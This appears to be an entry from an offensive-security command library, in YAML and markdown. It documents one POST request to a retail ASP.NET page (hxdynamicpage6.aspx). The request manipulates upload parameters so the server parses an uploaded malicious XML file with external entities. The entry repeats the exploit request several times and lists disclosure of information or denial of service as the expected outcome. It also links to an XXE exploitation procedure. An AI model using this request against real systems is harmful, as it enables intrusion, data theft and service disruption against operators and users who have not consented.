---
data: >-
  POST
  /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp;
tags:
  - xxe
  - post-request
type: command
executor: bash
platforms:
  - Web
id: db03a702-29f2-4914-ad51-912dad3bf06c
created_at: '2025-12-13T09:00:33.859Z'
updated_at: '2025-12-13T09:00:33.859Z'
verified: false
validated: true
submitted: true
---
# post-xxe-trigger-via-hxdynamicpage

## Command

```bash
POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp;
```

## Description

POST request to trigger XXE by forcing the server to parse an uploaded malicious XML file with external entities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `_hxpage` | Specifies the path to the uploaded XML file | Yes |
| `max_file_size_kb` | Sets maximum file size to 1024 KB | Yes |
| `allow_file_type_list` | Lists allowed file types, modified to include XML | Yes |

## Examples

### Basic Usage

```bash
POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp;
```

## Expected Output

Server fetches external DTD, potentially disclosing information or causing DoS.

## Related

- [[procedures/Exploit-XXE-via-Malicious-XML-Upload]]
